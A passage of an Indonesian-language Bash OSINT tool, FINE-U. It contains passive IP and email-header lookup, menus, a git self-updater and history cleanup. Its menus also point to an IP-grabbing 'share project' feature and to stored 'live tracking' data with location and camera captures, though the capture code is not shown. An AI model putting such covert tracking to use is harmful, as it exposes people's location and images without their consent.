        (if $h.replyDomain != "" and $h.fromDomain != "" and $h.replyDomain != $h.fromDomain
           then "  \($Y)▲ Reply-To berbeda domain dari From (\($h.fromDomain) vs \($h.replyDomain)): hati-hati, pola umum phishing.\($R)" else empty end),
        (if ($h.spf != "" and $h.spf != "pass") or ($h.dmarc != "" and $h.dmarc != "pass")
           then "  \($Y)▲ SPF / DMARC tidak lolos: pengirim mungkin dipalsukan.\($R)" else empty end),
        row("Jalur server"; ($h.hops | join(" → "))),
        (if ($h.publicIps | length) == 0
           then "  \($D)Tidak ada IP publik di header. Webmail besar (Gmail, Yahoo, Outlook) menyembunyikan IP asli pengirim; yang tampak hanya server mereka.\($R)"
           else "  \($D)Hop terlama biasanya paling dekat ke pengirim; hop terbaru milik server penerima.\($R)" end),
        ""' <<< "$IPREPORT"
  fi
  jq -r --arg B "$B" --arg D "$D" --arg G "$GRN" --arg Y "$YEL" --arg RD "$RED" --arg C "$CYN" --arg R "$R" --argjson w "$width" '
    def cut($n): gsub("\\s+";" ") | if length > $n then .[0:$n-1] + "…" else . end;
    def icon: if .state == "ok" then $G + "●" + $R elif .state == "warn" then $Y + "▲" + $R
              elif .state == "bad" then $RD + "✖" + $R elif .state == "fail" then $D + "✕" + $R
              else $D + "○" + $R end;
    .ips[] |
      "  \($C)●\($R) \($B)\(.ip)\($R)  \($D)\(.scope) · IPv\(.version)\($R)",
      (if .scope != "publik" then "    \($D)Bukan alamat publik: tidak ada data di internet yang bisa dicari.\($R)\n"
       else
         ( .modules | group_by(.category) | sort_by(. as $g | ["Jaringan","Lokasi","Reputasi"] | index($g[0].category))[]
           | "    \($B)\(.[0].category | ascii_upcase)\($R)",
             (.[] | "    \(icon) \($B)\(.title)\($R) \($D)· \(.summary | cut($w - 20))\($R)",
                (.lines[] | "        \($D)\(.k):\($R) \(.v | cut($w - 12))"),
                (.links[:3][] | "        \($C)\(.u)\($R)")),
             "")
       end)' <<< "$IPREPORT"
  local ex nf; ex=$(jq -r '.extra' <<< "$IPREPORT")
  [ "$ex" -gt 0 ] && printf '  %s%s IP lagi tidak diperiksa (batas %s IP per jalan).%s\n\n' "$D" "$ex" "$IP_MAX" "$R"
  nf=$(jq -r '[.ips[].failed | length] | add // 0' <<< "$IPREPORT")
  [ "$nf" -gt 0 ] && printf '  %s%s pemeriksaan tidak dijalankan (tidak terjangkau / batas harian).%s\n\n' "$D" "$nf" "$R"
  printf '  %sLokasi IP hanya perkiraan titik jaringan ISP, bukan alamat rumah atau identitas pemilik. Gunakan dengan bertanggung jawab (UU PDP).%s\n\n' "$D" "$R"
}

ip_result_screen() {
  header
  printf '  Hasil Cek IP untuk: %s%s%s\n\n' "$B" "$IP_INPUT" "$R"
  render_ip_report
  [ -n "$SAVED" ] && printf '  %s✓ Tersimpan:%s %s%s%s\n\n' "$GRN" "$R" "$D" "$SAVED" "$R"
}

# Submenu Cek IP: [1] Dapatkan IP (belum tersedia), [2] Cari IP (analisis pasif yang sudah ada).
ip_menu() {
  local notice="" ans shown
  while :; do
    header
    printf '  %sCEK IP%s\n\n' "$B" "$R"
    printf '  %s[1]%s Dapatkan IP\n' "$B$CYN" "$R"
    printf '  %s[2]%s Cari IP\n\n' "$B$CYN" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  Pilih menu %s(kosongkan lalu Enter untuk kembali)%s: ' "$D" "$R"
    read -r ans || exit 0
    ans=${ans#"${ans%%[![:space:]]*}"}; ans=${ans%"${ans##*[![:space:]]}"}
    case "$ans" in
      1) ip_get_session ;;
      2) ip_search_session ;;
      "") return ;;
      *)
        shown=${ans//[[:cntrl:]]/}; shown=${shown:0:20}
        notice="Input tidak dikenali: \"$shown\". Pilih 1 atau 2, atau kosongkan untuk kembali." ;;
    esac
  done
}

# Ganti fungsi ip_get_session() yang lama dengan ini:
ip_get_session() {
  share_project_session
}

# [2] Cari IP: analisis pasif IP / domain / header email (fitur Cek IP yang sudah ada).
ip_search_session() {
  local notice="" in
  while :; do
    header
    printf '  %sCARI IP%s  %s(kosongkan lalu Enter untuk kembali)%s\n\n' "$B" "$R" "$D" "$R"
    printf '  %sAnalisis alamat IP, domain, atau header email yang sudah Anda miliki: pemilik blok IP, ISP,%s\n' "$D" "$R"
    printf '  %sperkiraan lokasi, reverse DNS, node Tor, dan keaslian pengirim email.%s\n\n' "$D" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  Masukkan IP / domain / path file header email: '
    read -r in || exit 0
    in=$(sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' <<< "$in")
    [ -z "$in" ] && return
    header
    printf '  Memeriksa: %s%s%s\n\n' "$B" "$in" "$R"
    if ! ip_collect "$in"; then notice=$IP_ERR; continue; fi
    ip_do_check
    menu ip_result_screen "Cek IP lain" "Kembali"
    [ "$CHOICE" -eq 2 ] && return
  done
}

cli_ip() {
  ip_collect "$1" || { echo "$IP_ERR" >&2; exit 1; }
  printf 'Memeriksa: %s\n\n' "$IP_INPUT"
  ip_do_check
  render_ip_report
  printf '  Tersimpan: %s\n' "$SAVED"
}

# ---------- layar & menu ----------
pause() { printf '  %sTekan Enter untuk kembali...%s' "$D" "$R"; read -r _ || exit 0; }

menu() { # $1 = fungsi penggambar layar; sisanya = pilihan. Hasil di $CHOICE
  local draw=$1; shift
  local opts=("$@") notice="" ans i o
  while :; do
    "$draw"
    [ -n "$notice" ] && printf '  %s%s%s\n\n' "$RED" "$notice" "$R"
    i=1
    for o in "${opts[@]}"; do printf '  %s[%d]%s %s\n' "$B$CYN" "$i" "$R" "$o"; i=$((i + 1)); done
    printf '\n  Pilih nomor: '
    read -r ans || exit 0
    if [[ $ans =~ ^[0-9]+$ ]] && (( ans >= 1 && ans <= ${#opts[@]} )); then CHOICE=$ans; return; fi
    notice="Pilihan tidak valid. Ketik angka 1 sampai ${#opts[@]}."
  done
}

# ---------- UPDATE dari GitHub ----------
SELF="$(readlink -f "${BASH_SOURCE[0]}")"

update_worker() { # $1 = file status: baris 1 state, 2 pesan, 3 hash lama, 4 hash baru
  local out=$1 old new up msg backup=""
  export GIT_TERMINAL_PROMPT=0
  if ! command -v git >/dev/null; then printf 'error\nGit belum terpasang. Install: sudo apt install -y git\n\n\n' > "$out"; return; fi
  if ! git -C "$BASE" rev-parse --git-dir >/dev/null 2>&1; then
    printf 'error\nFolder ini bukan hasil git clone, jadi tidak bisa diperbarui otomatis.\n\n\n' > "$out"; return
  fi
  old=$(git -C "$BASE" rev-parse --short HEAD 2>/dev/null)
  if ! msg=$(timeout 60 git -C "$BASE" fetch --quiet origin 2>&1); then
    printf 'error\nTidak bisa menghubungi GitHub: %s\n%s\n\n' "$(tr '\n' ' ' <<< "$msg" | cut -c1-160)" "$old" > "$out"; return
  fi
  up=$(git -C "$BASE" rev-parse --verify -q '@{u}' 2>/dev/null)
  if [ -z "$up" ]; then printf 'error\nBranch ini belum terhubung ke GitHub (upstream).\n%s\n\n' "$old" > "$out"; return; fi
  if [ "$(git -C "$BASE" rev-parse HEAD)" = "$up" ] || git -C "$BASE" merge-base --is-ancestor "$up" HEAD 2>/dev/null; then
    printf 'uptodate\nSudah versi terbaru.\n%s\n%s\n' "$old" "$old" > "$out"; return
  fi
  # Sama seperti update manual: git fetch origin -> git reset --hard origin/main -> chmod +x.
  # Perubahan lokal pada file yang dilacak git dicadangkan dulu (git stash list); commit lokal yang
  # berbeda dari GitHub disimpan di cabang cadangan, jadi tidak ada yang benar-benar hilang.
  if [ -n "$(git -C "$BASE" status --porcelain --untracked-files=no 2>/dev/null)" ]; then
    git -C "$BASE" -c user.name=fine-u -c user.email=fine-u@localhost stash push -q -m "fine-u-cadangan-otomatis $(date +%F_%H-%M-%S)" >/dev/null 2>&1 && backup=1
  fi
  if ! git -C "$BASE" merge-base --is-ancestor HEAD "$up" 2>/dev/null; then
    git -C "$BASE" branch -f "fine-u-cadangan-$(date +%F_%H-%M-%S)" HEAD >/dev/null 2>&1 && backup=1
  fi
  if ! msg=$(git -C "$BASE" reset --hard "$up" 2>&1); then
    printf 'error\nGagal menyamakan dengan GitHub: %s\n%s\n\n' "$(tr '\n' ' ' <<< "$msg" | cut -c1-160)" "$old" > "$out"; return
  fi
  chmod +x "$BASE"/*.sh 2>/dev/null
  new=$(git -C "$BASE" rev-parse --short HEAD)
  printf 'updated\nBerhasil diperbarui.\n%s\n%s\n%s\n' "$old" "$new" "$backup" > "$out"
}

# animasi: blok bergerak selama proses berjalan, lalu bar penuh
update_loading() { # $1 = pid worker
  local pid=$1 w=32 pos=0 dir=1 n=0 i bar frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  clear_screen
  printf '\n\n  %sMEMPERBARUI FINE-U%s\n\n\n' "$B$CYN" "$R"
  while kill -0 "$pid" 2>/dev/null || [ "$n" -lt 20 ]; do
    bar=""
    for ((i = 0; i < w; i++)); do
      if [ "$i" -ge "$pos" ] && [ "$i" -lt $((pos + 6)) ]; then bar+="█"; else bar+="░"; fi
    done
    printf '\r  %s%s%s %s[%s]%s %sMenghubungi GitHub...%s\033[K' "$CYN" "${frames[n % 10]}" "$R" "$CYN" "$bar" "$R" "$D" "$R"
    pos=$((pos + dir)); [ "$pos" -ge $((w - 6)) ] && dir=-1; [ "$pos" -le 0 ] && dir=1
    n=$((n + 1)); sleep 0.05
  done
  for ((pos = 0; pos <= w; pos += 2)); do
    bar=""; for ((i = 0; i < w; i++)); do [ "$i" -lt "$pos" ] && bar+="█" || bar+="░"; done
    printf '\r  %s✓%s %s[%s]%s %sSelesai%s\033[K' "$GRN" "$R" "$GRN" "$bar" "$R" "$D" "$R"; sleep 0.02
  done
  sleep 0.25
}

# animasi: bar berubah menjadi logo FINE-U (muncul dari kiri ke kanan dengan efek noise)
update_logo() {
  local LC_ALL=C.UTF-8 w=0 l k j rest real noise=(░ ▒ ▓ █)
  for l in "${LOGO[@]}"; do [ "${#l}" -gt "$w" ] && w=${#l}; done
  clear_screen
  for ((k = 0; k <= w + 6; k += 2)); do
    printf '\033[H\n'
    for l in "${LOGO[@]}"; do
      real=${l:0:k}; rest=""
      for ((j = k; j < k + 6 && j < ${#l}; j++)); do rest+="${noise[RANDOM % 4]}"; done
      printf '  %s%s%s%s%s%s\033[K\n' "$B$CYN" "$real" "$R" "$D" "$rest" "$R"
    done
    sleep 0.025
  done
}

update_session() {
  local f st msg old new bk pid
  if [ ! -t 1 ]; then
    f=$(mktemp); update_worker "$f"; { read -r st; read -r msg; } < "$f"; rm -f "$f"; echo "$msg"; return
  fi
  f=$(mktemp)
  update_worker "$f" & pid=$!
  update_loading "$pid"
  wait "$pid" 2>/dev/null
  { read -r st; read -r msg; read -r old; read -r new; read -r bk; } < "$f"; rm -f "$f"
  case "$st" in
    updated)
      update_logo
      printf '\n  %s✓ Berhasil diperbarui%s  %s%s → %s%s\n' "$GRN" "$R" "$D" "$old" "$new" "$R"
      [ "${bk:-0}" = 1 ] && printf '  %sPerubahan lokal lama dicadangkan otomatis (git stash list / cabang fine-u-cadangan-*).%s\n' "$D" "$R"
      sleep 1.6
      MAIN_NOTICE="✓ FINE-U sudah diperbarui ($old → $new). Sekarang memakai versi terbaru."
      [ "${bk:-0}" = 1 ] && MAIN_NOTICE+=" Perubahan lokal lama ada di cadangan git."
      clear_screen
      FINEU_RELOAD_NOTICE="$MAIN_NOTICE" exec bash "$SELF" ;;
    uptodate)
      update_logo
      printf '\n  %s✓ Sudah versi terbaru%s  %s(%s)%s\n' "$GRN" "$R" "$D" "$new" "$R"
      sleep 1.2
      MAIN_NOTICE="✓ FINE-U sudah versi terbaru ($new)." ;;
    *)
      header
      printf '  %s✖ Update gagal%s\n\n  %s\n\n' "$RED" "$R" "$msg"
      pause ;;
  esac
}

# Menu utama: FITUR dipilih dengan angka, TAMBAHAN dengan huruf (besar/kecil sama saja).
# Input salah tidak menutup program: tampil pesan, lalu input diminta lagi. Hasil di $CHOICE (1 2 3 h s p u x).
main_menu() {
  local notice="" ans shown
  while :; do
    header
    [ -n "${MAIN_NOTICE:-}" ] && { printf '  %s%s%s\n\n' "$GRN" "$MAIN_NOTICE" "$R"; MAIN_NOTICE=""; }
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  %sFITUR%s\n' "$B" "$R"
    printf '  %s[1]%s Mulai cari\n' "$B$CYN" "$R"
    printf '  %s[2]%s Cari email\n' "$B$CYN" "$R"
    printf '  %s[3]%s Cek IP\n\n' "$B$CYN" "$R"
    printf '  %sTAMBAHAN%s\n' "$B" "$R"
    printf '  %s[H]%s Riwayat hasil\n' "$B$CYN" "$R"
    printf '  %s[S]%s Status sumber\n' "$B$CYN" "$R"
    printf '  %s[P]%s Setting\n' "$B$CYN" "$R"
    printf '  %s[U]%s Update\n' "$B$CYN" "$R"
    printf '  %s[X]%s Keluar\n' "$B$CYN" "$R"
    printf '\n  Pilih menu: '
    read -r ans || exit 0
    ans=${ans#"${ans%%[![:space:]]*}"}; ans=${ans%"${ans##*[![:space:]]}"}; ans=${ans,,}
    case "$ans" in 1|2|3|h|s|p|u|x) CHOICE=$ans; return ;; esac
    shown=${ans//[[:cntrl:]]/}; shown=${shown:0:20}
    if [ -z "$shown" ]; then notice="Input kosong. Pilih 1, 2, atau 3 untuk fitur, atau H / S / P / U / X untuk menu tambahan."
    else notice="Input tidak dikenali: \"$shown\". Pilih 1, 2, atau 3 untuk fitur, atau H / S / P / U / X untuk menu tambahan."; fi
  done
}

result_screen() {
  header
  printf '  Hasil untuk: %s%s%s\n\n' "$B" "$QUERY" "$R"
  show_report
  [ -n "$SAVED" ] && printf '  %s✓ Tersimpan:%s %s%s%s\n\n' "$GRN" "$R" "$D" "$SAVED" "$R"
}

search_session() {
  while :; do
    header
    printf '  %sMULAI CARI%s  %s(mode %s; kosongkan lalu Enter untuk kembali)%s\n\n' "$B" "$R" "$D" "$SEARCH_MODE" "$R"
    printf '  Masukkan nama / lokasi / barang: '
    read -r QUERY || exit 0
    QUERY=$(sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' <<< "$QUERY" | tr -s ' ')
    [ -z "$QUERY" ] && return

    header
    printf '  Mencari: %s%s%s\n\n' "$B" "$QUERY" "$R"
    run_scan "$QUERY"
    SAVED=""
    [ "$(jq -r '.total' <<< "$REPORT")" -gt 0 ] && SAVED=$(save_report)

    menu result_screen "Cari lagi" "Kembali"
    [ "$CHOICE" -eq 2 ] && return
  done
}

view_file() {
  if [ -t 1 ] && command -v less >/dev/null; then less -fR "$1"; else cat "$1"; fi
}

# Layar hasil dengan satu pilihan [X]; $1 = fungsi penggambar layar, $2 = label
menu_x() {
  local draw=$1 label=$2 ans notice=""
  while :; do
    "$draw"
    [ -n "$notice" ] && printf '  %s%s%s\n\n' "$RED" "$notice" "$R"
    printf '  %s[X]%s %s\n' "$B$CYN" "$R" "$label"
    printf '\n  Pilih: '
    read -r ans || exit 0
    ans=${ans#"${ans%%[![:space:]]*}"}; ans=${ans%"${ans##*[![:space:]]}"}
    [ "${ans,,}" = x ] && return
    notice="Pilihan tidak valid. Ketik X untuk input kembali."
  done
}

# Buka satu hasil riwayat dengan tampilan yang sama seperti saat pencarian berjalan
history_open() { # $1=file .md  $2=jenis (umum|email|ip) $3=judul riwayat
  local md=$1 kind=$2 title=${3// · / } js=${1%.md}.json
  [ -r "$js" ] || { view_file "$md"; return; }
  SAVED=${md/#$PWD\//}
  if [ "$kind" = umum ]; then
    REPORT=$(jq -c . "$js") || { view_file "$md"; return; }
    QUERY=$(jq -r '.query' <<< "$REPORT")
    menu_x result_screen "Input kembali  (ke $title)"
  elif [ "$kind" = ip ]; then
    IPREPORT=$(jq -c . "$js") || { view_file "$md"; return; }
    IP_INPUT=$(jq -r '.input' <<< "$IPREPORT")
    menu_x ip_result_screen "Input kembali  (ke $title)"
  else
    EREPORT=$(jq -c . "$js") || { view_file "$md"; return; }
    EMAIL=$(jq -r '.email' <<< "$EREPORT")
    menu_x email_result_screen "Input kembali  (ke $title)"
  fi
}

history_browse() { # $1=folder $2=judul $3=ekspresi jq untuk label $4=jenis (umum|email)
  local base=$1 title=$2 expr=$3 kind=${4:-umum} dirs d last n q ans i notice=""
  while :; do
    header
    printf '  %s%s%s\n\n' "$B" "$title" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    mapfile -t dirs < <(find "$base" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
    if [ "${#dirs[@]}" -eq 0 ]; then
      printf '  Belum ada hasil tersimpan untuk jenis ini.\n\n'; pause; return
    fi
    i=1
    for d in "${dirs[@]}"; do
      last=$(find "$d" -name '*.md' | sort | tail -n1)
      n=$(find "$d" -name '*.md' | wc -l)
      q=$(jq -r "$expr // empty" "${last%.md}.json" 2>/dev/null); q=${q:-$(basename "$d")}
      printf '  %s[%d]%s %s  %s(%d pencarian, terakhir %s)%s\n' "$B$CYN" "$i" "$R" "$q" "$D" "$n" \
        "$(basename "$last" .md)" "$R"
      i=$((i + 1))
    done
    printf '\n  Nomor untuk membuka hasil terakhir (kosongkan untuk kembali): '
    read -r ans || exit 0
    [ -z "$ans" ] && return
    if [[ $ans =~ ^[0-9]+$ ]] && (( ans >= 1 && ans <= ${#dirs[@]} )); then
      history_open "$(find "${dirs[ans-1]}" -name '*.md' | sort | tail -n1)" "$kind" "${title,,}"
    else
      if [ "${#dirs[@]}" -eq 1 ]; then notice="Input tidak valid. Ketik angka 1, atau kosongkan lalu Enter untuk kembali."
      else notice="Input tidak valid. Ketik angka 1 sampai ${#dirs[@]}, atau kosongkan lalu Enter untuk kembali."; fi
    fi
  done
}

count_dirs() { find "$1" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l; }

# ---------- BERSIHKAN RIWAYAT ----------
HIST_NOTICE=""; HIST_NOTICE_CLR=""

hist_label() { # $1=folder $2=ekspresi jq -> "label  (n pencarian, terakhir ...)"
  local d=$1 expr=$2 last n q=""
  last=$(find "$d" -name '*.md' | sort | tail -n1)
  n=$(find "$d" -name '*.md' | wc -l)
  [ -n "$last" ] && q=$(jq -r "$expr // empty" "${last%.md}.json" 2>/dev/null)
  q=${q:-$(basename "$d")}
  if [ -n "$last" ]; then printf '%s  (%d pencarian, terakhir %s)' "$q" "$n" "$(basename "$last" .md)"
  else printf '%s  (kosong)' "$q"; fi
}

# kode acak 6 karakter: huruf besar, huruf kecil, angka, dan karakter spesial (mis. Aq2$F2)
gen_code() {
  local up=ABCDEFGHJKLMNPQRSTUVWXYZ lo=abcdefghijkmnpqrstuvwxyz di=23456789 sp='!@#$%&*?+=' all c i
  all=$up$lo$di$sp
  c=${up:RANDOM%${#up}:1}${lo:RANDOM%${#lo}:1}${di:RANDOM%${#di}:1}${sp:RANDOM%${#sp}:1}
  for ((i = 0; i < 2; i++)); do c+=${all:RANDOM%${#all}:1}; done
  fold -w1 <<< "$c" | shuf | tr -d '\n'
}

# Layar konfirmasi. Memakai KEEP_TXT (dijaga, boleh kosong), DEL_TXT (dihapus). Return 0 = lanjut, 1 = batal.
clean_confirm() {
  local code ans notice="" t
  code=$(gen_code)
  while :; do
    header
    printf '  %sKONFIRMASI PENGHAPUSAN%s\n\n' "$B" "$R"
    if [ "${#KEEP_TXT[@]}" -gt 0 ]; then
      printf '  %sDATA YANG DIJAGA (%d)%s\n' "$B$GRN" "${#KEEP_TXT[@]}" "$R"
      for t in "${KEEP_TXT[@]}"; do printf '    %s✔%s %s\n' "$GRN" "$R" "$t"; done
      printf '\n'
    fi
    printf '  %sDATA YANG AKAN DIHAPUS (%d)%s\n' "$B$RED" "${#DEL_TXT[@]}" "$R"
    for t in "${DEL_TXT[@]}"; do printf '    %s✖%s %s\n' "$RED" "$R" "$t"; done
    printf '\n  %sData yang dihapus tidak bisa dikembalikan.%s\n\n' "$YEL" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  Ketik kode ini untuk melanjutkan: %s%s%s\n' "$B$YEL" "$code" "$R"
    printf '  Ketik %sX%s untuk membatalkan.\n\n  Kode: ' "$B$CYN" "$R"
    IFS= read -r ans || exit 0
    [ "$ans" = "$code" ] && return 0
    [ "${ans,,}" = x ] && return 1
    notice="Kode tidak cocok. Ketik persis seperti kode di atas (huruf besar/kecil berpengaruh), atau X untuk batal."
  done
}

clean_delete() { # menghapus semua folder di DEL_PATHS, lalu mengisi HIST_NOTICE
  local d n=0
  for d in "${DEL_PATHS[@]}"; do
    case "$d" in "$BASE/hasil/"?*|"$EMAIL_DIR/"?*|"$IP_DIR/"?*) rm -rf -- "$d" && n=$((n + 1)) ;; esac
  done
  HIST_NOTICE="✓ $n data riwayat dihapus."; HIST_NOTICE_CLR=$GRN
}

# Satu jenis riwayat. Return 2 jika selesai (dihapus / dibatalkan di konfirmasi), 0 jika kembali.
clean_kind() { # $1=folder $2=ekspresi jq $3=nama jenis
  local base=$1 expr=$2 name=$3 dirs=() lbl=() d i n ans mode notice="" tok
  mapfile -t dirs < <(find "$base" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
  n=${#dirs[@]}
  if [ "$n" -eq 0 ]; then
    header; printf '  %sBERSIHKAN · %s%s\n\n  Belum ada data tersimpan untuk jenis ini.\n\n' "$B" "${name^^}" "$R"; pause; return 0
  fi
  for d in "${dirs[@]}"; do lbl+=("$(hist_label "$d" "$expr")"); done

  while :; do   # --- pilih cara menghapus
    header
    printf '  %sBERSIHKAN · %s%s  %s(%d data)%s\n\n' "$B" "${name^^}" "$R" "$D" "$n" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  Bagaimana cara menghapusnya?\n\n'
    printf '  %s[1]%s Pilih data  %s(data yang kamu pilih akan DIHAPUS)%s\n' "$B$CYN" "$R" "$D" "$R"
    printf '  %s[2]%s Jaga data   %s(data yang kamu pilih DIJAGA, sisanya dihapus)%s\n' "$B$CYN" "$R" "$D" "$R"
    printf '\n  Pilih nomor (kosongkan untuk kembali): '
    read -r mode || exit 0
    mode=${mode//[[:space:]]/}
    case "$mode" in
      "") return 0 ;;
      1|2) ;;
      *) notice="Pilihan tidak valid. Ketik 1 atau 2, atau kosongkan lalu Enter untuk kembali."; continue ;;
    esac

    while :; do   # --- pilih nomor data
      header
      printf '  %sBERSIHKAN · %s%s  %s(%s)%s\n\n' "$B" "${name^^}" "$R" "$D" "$([ "$mode" = 1 ] && echo "mode: pilih data yang dihapus" || echo "mode: jaga data yang dipilih")" "$R"
      [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
      for ((i = 0; i < n; i++)); do printf '  %s[%d]%s %s\n' "$B$CYN" $((i + 1)) "$R" "${lbl[i]}"; done
      printf '\n  Nomor data yang %s (bisa lebih dari satu, mis. 1,4,17; kosongkan untuk kembali): ' \
        "$([ "$mode" = 1 ] && echo "ingin DIHAPUS" || echo "ingin DIJAGA")"
      read -r ans || exit 0
      ans=${ans//,/ }
      [ -z "${ans//[[:space:]]/}" ] && break
      declare -A sel=(); local bad="" toks=()
      read -ra toks <<< "$ans"
      for tok in "${toks[@]}"; do
        if [[ $tok =~ ^[0-9]+$ ]] && (( 10#$tok >= 1 && 10#$tok <= n )); then sel[$((10#$tok))]=1; else bad=$tok; break; fi
      done
      if [ -n "$bad" ]; then
        notice="Nomor tidak valid: \"${bad:0:20}\". Gunakan angka 1 sampai $n, dipisah koma (mis. 1,4,17)."; unset sel; continue
      fi
      DEL_PATHS=(); DEL_TXT=(); KEEP_TXT=()
      for ((i = 0; i < n; i++)); do
        if [ -n "${sel[$((i + 1))]:-}" ]; then
          if [ "$mode" = 1 ]; then DEL_PATHS+=("${dirs[i]}"); DEL_TXT+=("${lbl[i]}"); else KEEP_TXT+=("${lbl[i]}"); fi
        elif [ "$mode" = 2 ]; then DEL_PATHS+=("${dirs[i]}"); DEL_TXT+=("${lbl[i]}"); fi
      done
      unset sel
      if [ "${#DEL_PATHS[@]}" -eq 0 ]; then notice="Semua data dipilih untuk dijaga, jadi tidak ada yang dihapus."; continue; fi
      if clean_confirm; then clean_delete; else HIST_NOTICE="Dibatalkan. Tidak ada data yang dihapus."; HIST_NOTICE_CLR=$YEL; fi
      return 2
    done
  done
}

clean_all() { # semua riwayat (pencarian umum + cek email). Return 2 jika selesai, 0 jika tidak ada data.
  local d
  DEL_PATHS=(); DEL_TXT=(); KEEP_TXT=()
  while IFS= read -r d; do [ -n "$d" ] && { DEL_PATHS+=("$d"); DEL_TXT+=("[cari]   $(hist_label "$d" '.query')"); }; done \
    < <(find "$BASE/hasil" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
  while IFS= read -r d; do [ -n "$d" ] && { DEL_PATHS+=("$d"); DEL_TXT+=("[email]  $(hist_label "$d" '"\(.email)  · skor \(.score)/100"')"); }; done \
    < <(find "$EMAIL_DIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
  while IFS= read -r d; do [ -n "$d" ] && { DEL_PATHS+=("$d"); DEL_TXT+=("[ip]     $(hist_label "$d" '"\(.input)  · \(.ips | length) IP"')"); }; done \
    < <(find "$IP_DIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
  if [ "${#DEL_PATHS[@]}" -eq 0 ]; then
    header; printf '  %sBERSIHKAN · SEMUA%s\n\n  Belum ada data tersimpan.\n\n' "$B" "$R"; pause; return 0
  fi
  if clean_confirm; then clean_delete; else HIST_NOTICE="Dibatalkan. Tidak ada data yang dihapus."; HIST_NOTICE_CLR=$YEL; fi
  return 2
}

clean_menu() { # setelah hapus / batal, kembali ke menu ini (Enter kosong = ke Riwayat hasil)
  local ans notice="" rc
  while :; do
    header
    printf '  %sBERSIHKAN RIWAYAT%s  %s(pilih jenis yang mau dibersihkan)%s\n\n' "$B" "$R" "$D" "$R"
    [ -n "$HIST_NOTICE" ] && { printf '  %s%s%s\n\n' "${HIST_NOTICE_CLR:-$GRN}" "$HIST_NOTICE" "$R"; HIST_NOTICE=""; }
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  %s[1]%s Pencarian umum  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$BASE/hasil")" "$R"
    printf '  %s[2]%s Cek email  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$EMAIL_DIR")" "$R"
    printf '  %s[3]%s Cek IP  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$IP_DIR")" "$R"
    printf '  %s[4]%s Semua  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(( $(count_dirs "$BASE/hasil") + $(count_dirs "$EMAIL_DIR") + $(count_dirs "$IP_DIR") ))" "$R"
    printf '\n  Pilih nomor (kosongkan untuk kembali): '
    read -r ans || exit 0
    ans=${ans//[[:space:]]/}
    rc=0
    case "$ans" in
      "") return 0 ;;
      1) clean_kind "$BASE/hasil" '.query' "pencarian umum" || rc=$? ;;
      2) clean_kind "$EMAIL_DIR" '"\(.email)  · skor \(.score)/100"' "cek email" || rc=$? ;;
      3) clean_kind "$IP_DIR" '"\(.input)  · \(.ips | length) IP"' "cek IP" || rc=$? ;;
      4) clean_all || rc=$? ;;
      *) notice="Pilihan tidak valid. Ketik 1, 2, 3, atau 4, atau kosongkan lalu Enter untuk kembali."; continue ;;
    esac
  done
}

history_session() {
  local ans notice=""
  while :; do
    header
    printf '  %sRIWAYAT HASIL%s  %s(pilih jenis riwayat atau data tangkapan)%s\n\n' "$B" "$R" "$D" "$R"
    [ -n "$HIST_NOTICE" ] && { printf '  %s%s%s\n\n' "${HIST_NOTICE_CLR:-$GRN}" "$HIST_NOTICE" "$R"; HIST_NOTICE=""; }
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    printf '  %s[1]%s Pencarian umum  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$BASE/hasil")" "$R"
    printf '  %s[2]%s Cek email  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$EMAIL_DIR")" "$R"
    printf '  %s[3]%s Cek IP  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$IP_DIR")" "$R"
    printf '  %s[4]%s Data Live Tracking (Lokasi & Kamera)\n' "$B$CYN" "$R"
    printf '  %s[Bersihkan]%s\n' "$B$CYN" "$R"
    printf '\n  Pilih nomor (kosongkan untuk kembali): '
    read -r ans || exit 0
    ans=${ans#"${ans%%[![:space:]]*}"}; ans=${ans%"${ans##*[![:space:]]}"}
    case "${ans,,}" in
      "") return ;;
      1) history_browse "$BASE/hasil" "RIWAYAT · PENCARIAN UMUM" '.query' umum ;;
      2) history_browse "$EMAIL_DIR" "RIWAYAT · CEK EMAIL" '"\(.email)  · skor \(.score)/100"' email ;;
      3) history_browse "$IP_DIR" "RIWAYAT · CEK IP" '"\(.input)  · \(.ips | length) IP"' ip ;;
      4) browse_live_tracking_data ;;
      bersihkan) clean_menu || true ;;
      *) notice="Pilihan tidak valid. Ketik 1, 2, 3, 4, atau Bersihkan, atau kosongkan lalu Enter untuk kembali." ;;
    esac
  done
}

# Fungsi tambahan untuk membuka dan melihat daftar folder/data tangkapan Live Tracking
browse_live_tracking_data() {
  local vid_dir="$BASE/saved_videos"
